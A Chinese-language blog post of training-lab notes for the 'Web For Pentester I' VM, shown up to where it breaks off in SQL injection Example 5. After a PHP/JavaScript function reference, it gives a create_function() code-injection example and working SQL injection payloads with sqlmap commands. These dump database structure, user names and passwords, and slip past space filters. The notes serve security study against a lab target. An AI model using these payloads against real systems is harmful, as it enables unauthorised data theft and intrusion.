<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Web For Pentester I 练习笔记 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="Web For Pentester I 练习笔记 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">Web For Pentester I 练习笔记</h1><div class="post-time">Jul 20, 2017</div><div class="post-content"><!-- ttoc -->
<h2><span id="huan-jing-da-jian">环境搭建</span><a href="#huan-jing-da-jian" class="header-anchor">#</a></h2><p>ISO镜像:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">web_for_pentester_i386.iso</a></p>
<p>新建虚拟机添加web_for_pentester_i386.iso镜像，桥接网络即可。</p>
<h2><span id="ji-chu-zhi-shi">基础知识</span><a href="#ji-chu-zhi-shi" class="header-anchor">#</a></h2><h3><span id="preg-match">preg_match()</span><a href="#preg-match" class="header-anchor">#</a></h3><p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int preg_match( string pattern, string subject [, array matches ] )</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配检索的对象</td>
</tr>
<tr>
<td>matches</td>
<td style="text-align:center">可选，存储匹配结果的数组， matches[0] 将包含与整个模式匹配的文本 matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推</td>
</tr>
</tbody>
</table>
<h3><span id="preg-replace">preg_replace()</span><a href="#preg-replace" class="header-anchor">#</a></h3><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>replacement</td>
<td style="text-align:center">替换的内容</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配替换的对象</td>
</tr>
<tr>
<td>limit</td>
<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
</tr>
</tbody>
</table>
<h4><span id="te-bie-shuo-ming">特别说明</span><a href="#te-bie-shuo-ming" class="header-anchor">#</a></h4><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
<h3><span id="zheng-ze-biao-da-shi-zhong-de-mo-shi-xiu-zheng-fu">正则表达式中的模式修正符</span><a href="#zheng-ze-biao-da-shi-zhong-de-mo-shi-xiu-zheng-fu" class="header-anchor">#</a></h3><p>模式修正符就是字母，只不过这些在模式修正符的应用之中有特殊的含义。下面我来看看都有哪些模式修正符，请看下表： </p>
<table>
<thead>
<tr>
<th>模式修正符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>i</td>
<td style="text-align:center">表示在和模式进行匹配进不区分大小写</td>
</tr>
<tr>
<td>m</td>
<td style="text-align:center">将模式视为多行，使用^和$表示任何一行都可以以正则表达式开始或结束</td>
</tr>
<tr>
<td>s</td>
<td style="text-align:center">如果没有使用这个模式修正符号，元字符中的”.”默认不能表示换行符号,将字符串视为单行</td>
</tr>
<tr>
<td>x</td>
<td style="text-align:center">表示模式中的空白忽略不计</td>
</tr>
<tr>
<td>e</td>
<td style="text-align:center">正则表达式必须使用在preg_replace替换字符串的函数中时才可以使用</td>
</tr>
<tr>
<td>A</td>
<td style="text-align:center">以模式字符串开头，相当于元字符^</td>
</tr>
<tr>
<td>Z</td>
<td style="text-align:center">以模式字符串结尾，相当于元字符$</td>
</tr>
<tr>
<td>U</td>
<td style="text-align:center">正则表达式的特点：就是比较“贪婪”，使用该模式修正符可以取消贪婪模式</td>
</tr>
</tbody>
</table>
<h3><span id="prompt">prompt()</span><a href="#prompt" class="header-anchor">#</a></h3><p>prompt() 方法用于显示可提示用户进行输入的对话框</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prompt(text,defaultText)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>text</td>
<td style="text-align:center">可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）。</td>
</tr>
<tr>
<td>defaultText</td>
<td style="text-align:center">可选。默认的输入文本。</td>
</tr>
</tbody>
</table>
<h3><span id="confirm">confirm()</span><a href="#confirm" class="header-anchor">#</a></h3><p>confirm() 方法用于显示一个带有指定消息和 OK 及取消按钮的对话框。</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confirm(message)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>message</td>
<td style="text-align:center">要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）</td>
</tr>
</tbody>
</table>
<h3><span id="fromcharcode">fromCharCode()</span><a href="#fromcharcode" class="header-anchor">#</a></h3><p>fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(numX,numX,...,numX)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>numX</td>
<td style="text-align:center">必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</td>
</tr>
</tbody>
</table>
<h3><span id="eval-string">eval(string)</span><a href="#eval-string" class="header-anchor">#</a></h3><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。要计算的字符串，其中含有要计算的 JavaScript 表达式或要执行的语句。</td>
</tr>
</tbody>
</table>
<h3><span id="document-write">Document.write()</span><a href="#document-write" class="header-anchor">#</a></h3><p>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。<br>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(exp1,exp2,exp3,....)</span><br></pre></td></tr></table></figure>
<h3><span id="location-hash">location.hash</span><a href="#location-hash" class="header-anchor">#</a></h3><p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</p>
<p>假设当前的URL是<a href="http://www.uknowsec/test.htm#PART2：" target="_blank" rel="noopener">http://www.uknowsec/test.htm#PART2：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">document.write(location.hash);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>以上实例输出结果：</p>
<p>#part2</p>
<h3><span id="substring">substring()</span><a href="#substring" class="header-anchor">#</a></h3><p>substring() 方法用于提取字符串中介于两个指定下标之间的字符。</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stringObject.substring(start,stop)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>start</td>
<td style="text-align:center">必需。一个非负的整数，规定要提取的子串的第一个字符在 stringObject 中的位置。</td>
</tr>
<tr>
<td>stop</td>
<td style="text-align:center">可选。一个非负的整数，比要提取的子串的最后一个字符在 stringObject 中的位置多 1。如果省略该参数，那么返回的子串会一直到字符串的结尾。</td>
</tr>
</tbody>
</table>
<h3><span id="strstr">strstr()</span><a href="#strstr" class="header-anchor">#</a></h3><p>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>注释：该函数是二进制安全的。<br>注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr(string,search,before_search)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td>search</td>
<td style="text-align:center">必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。</td>
</tr>
<tr>
<td>before_search</td>
<td style="text-align:center">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。</td>
</tr>
</tbody>
</table>
<h3><span id="addslashes">addslashes()</span><a href="#addslashes" class="header-anchor">#</a></h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes(string)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<h3><span id="create-function-dai-ma-zhu-ru">create_function()代码注入</span><a href="#create-function-dai-ma-zhu-ru" class="header-anchor">#</a></h3><h4><span id="ce-shi-huan-jing-ban-ben">测试环境版本：</span><a href="#ce-shi-huan-jing-ban-ben" class="header-anchor">#</a></h4><p>apache +php 5.2、apache +php 5.3</p>
<h4><span id="you-wen-ti-de-dai-ma">有问题的代码：</span><a href="#you-wen-ti-de-dai-ma" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//02-8.php?id=2;&#125;phpinfo();/*</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$str2=&apos;echo  &apos;.$a.&apos;test&apos;.$id.&quot;;&quot;;</span><br><span class="line">echo $str2;</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;==============================&quot;;</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$f1 = create_function(&apos;$a&apos;,$str2);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;==============================&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="li-yong-fang-fa">利用方法：</span><a href="#li-yong-fang-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/libtest/02-8.php?id=2;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure>
<h4><span id="shi-xian-yuan-li">实现原理：</span><a href="#shi-xian-yuan-li" class="header-anchor">#</a></h4><p>由于id=2;}phpinfo();/*<br>执行函数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line">function fT($a) &#123;</span><br><span class="line">  echo &quot;test&quot;.$a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注入后代码：</span><br><span class="line">function fT($a) &#123;</span><br><span class="line">  echo &quot;test&quot;;&#125;</span><br><span class="line">  phpinfo();/*;//此处为注入代码。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="trim">trim()</span><a href="#trim" class="header-anchor">#</a></h3><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
<h4><span id="xiang-guan-han-shu">相关函数：</span><a href="#xiang-guan-han-shu" class="header-anchor">#</a></h4><p>ltrim() - 移除字符串左侧的空白字符或其他预定义字符<br>rtrim() - 移除字符串右侧的空白字符或其他预定义字符</p>
<h4><span id="yu-fa">语法</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim(string,charlist)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要检查的字符串。</td>
</tr>
<tr>
<td>charlist</td>
<td style="text-align:center">可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符： “\0” - NULL “\t” - 制表符 “\n” - 换行 “\x0B” - 垂直制表符 “\r” - 回车 “ “ - 空格</td>
</tr>
</tbody>
</table>
<h3><span id="htmlentities">htmlentities()</span><a href="#htmlentities" class="header-anchor">#</a></h3><p>htmlentities() 函数把字符转换为 HTML 实体。</p>
<h4><span id="yu-fa">语法</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlentities(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转换的字符串。</td>
</tr>
<tr>
<td>flags</td>
<td style="text-align:center">可选。规定如何处理引号、无效的编码以及使用哪种文档类型。</td>
</tr>
<tr>
<td>character-set</td>
<td style="text-align:center">可选。一个规定了要使用的字符集的字符串。</td>
</tr>
<tr>
<td>double_encode</td>
<td style="text-align:center">可选。布尔值，规定是否编码已存在的 HTML 实体。 TRUE - 默认。将对每个实体进行转换。FALSE - 不会对已存在的 HTML 实体进行编码。</td>
</tr>
</tbody>
</table>
<h3><span id="header">header()</span><a href="#header" class="header-anchor">#</a></h3><p>header() 函数向客户端发送原始的 HTTP 报头。</p>
<h4><span id="yu-fa">语法：</span><a href="#yu-fa" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(string,replace,http_response_code)</span><br></pre></td></tr></table></figure>
<h4><span id="can-shu-shuo-ming">参数说明：</span><a href="#can-shu-shuo-ming" class="header-anchor">#</a></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要发送的报头字符串。</td>
</tr>
<tr>
<td>replace</td>
<td style="text-align:center">可选。指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。</td>
</tr>
<tr>
<td>http_response_code</td>
<td style="text-align:center">可选。把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</td>
</tr>
</tbody>
</table>
<h2><span id="sql-injections">SQL injections</span><a href="#sql-injections" class="header-anchor">#</a></h2><h3><span id="example-1">Example 1</span><a href="#example-1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql); if ($result) &#123; ?&gt;</span><br></pre></td></tr></table></figure>
<p>字符类型的注入，无过滤<br>用来练习手注是个不错的题目</p>
<h4><span id="pan-duan-zhu-ru-dian">判断注入点</span><a href="#pan-duan-zhu-ru-dian" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; 页面返回异常</span><br><span class="line"></span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=1%23 页面返回正常</span><br><span class="line"></span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=2%23 页面返回正常</span><br></pre></td></tr></table></figure>
<h4><span id="pan-duan-zi-duan-chang">判断字段长</span><a href="#pan-duan-zi-duan-chang" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 5%23 页面返回正常</span><br><span class="line"></span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 6%23 页面返回异常</span><br></pre></td></tr></table></figure>
<p>推断出这个表中有5个字段</p>
<h4><span id="cai-jie-dang-qian-shu-ju-ku-ming">猜解当前数据库名；</span><a href="#cai-jie-dang-qian-shu-ju-ku-ming" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,database(),3,4,5%23</span><br></pre></td></tr></table></figure>
<h4><span id="cai-jie-suo-you-de-shu-ju-ku">猜解所有的数据库</span><a href="#cai-jie-suo-you-de-shu-ju-ku" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,SCHEMA_NAME,3,4,5 from information_schema.SCHEMATA%23</span><br></pre></td></tr></table></figure>
<h4><span id="cai-jie-suo-you-de-biao-ming">猜解所有的表名</span><a href="#cai-jie-suo-you-de-biao-ming" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables%23</span><br></pre></td></tr></table></figure>
<h4><span id="cai-jie-dang-qian-shu-ju-ku-exercises-de-suo-yi-biao-ming">猜解当前数据库（exercises）的所以表名</span><a href="#cai-jie-dang-qian-shu-ju-ku-exercises-de-suo-yi-biao-ming" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables where table_schema= database()%23</span><br></pre></td></tr></table></figure>
<h4><span id="cai-jie-dang-qian-shu-ju-ku-de-user-de-zi-duan-ming">猜解当前数据库的user的字段名</span><a href="#cai-jie-dang-qian-shu-ju-ku-de-user-de-zi-duan-ming" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,COLUMN_NAME,2,4,5 from information_schema.COLUMNS where table_name = &apos;users&apos;%23</span><br></pre></td></tr></table></figure>
<h4><span id="pan-duan-ban-ben-hao">判断版本号</span><a href="#pan-duan-ban-ben-hao" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,version(),2,4,5%23</span><br></pre></td></tr></table></figure>
<h4><span id="pan-duan-yong-hu-ming">判断用户名</span><a href="#pan-duan-yong-hu-ming" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,user(),2,4,5%23  </span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,current_user(),2,4,5%23</span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,system_user(),2,4,5%23</span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,session_user(),2,4,5%23</span><br></pre></td></tr></table></figure>
<h4><span id="du-qu-zhi">读取值</span><a href="#du-qu-zhi" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,name,passwd,4,5 from users%23</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span><a href="#sqlmap" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example1.php?name=root --dbs</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span><a href="#example-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/ /&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>与example1差不多，过滤了空格，语句中存现空格就会报错</p>
<p>mysql注入绕过空格过滤的方法：</p>
<p>1、水平制表(HT) url编码：%09</p>
<p>2、注释绕过空格   /<em>注释</em>/</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;%09union%09select%091,name,passwd,4,5%09from%09users%23  %09替换空格绕过</span><br><span class="line"></span><br><span class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23  /**/替换空格绕过</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span><a href="#sqlmap" class="header-anchor">#</a></h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</span><br></pre></td></tr></table></figure></p>
<h3><span id="example-3">Example 3</span><a href="#example-3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/\s+/&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;;</span><br></pre></td></tr></table></figure>
<p>在example2的基础上，\s匹配任何空白字符,包括空格、制表符、换页符等，全部过滤掉<br>可以使用example2中 /<em>注释</em>/ 绕过过滤</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span><a href="#sqlmap" class="header-anchor">#</a></h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</span><br></pre></td></tr></table></figure>
<h3><span id="example-4">Example 4</span><a href="#example-4" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users where id=&quot;; $sql.=mysql_real_escape_string($_GET[&quot;id&quot;]).&quot; &quot;; $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>数值型的注入，过滤了单引号等，对数值型无效</p>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</span><br><span class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span><a href="#sqlmap" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example4.php?id=2 --dbs</span><br></pre></td></tr></table></figure>
<h3><span id="example-5">Example 5</span><a href="#example-5" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&apos;/^[0-9]+/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</span><br></pre></td></tr></table></figure>
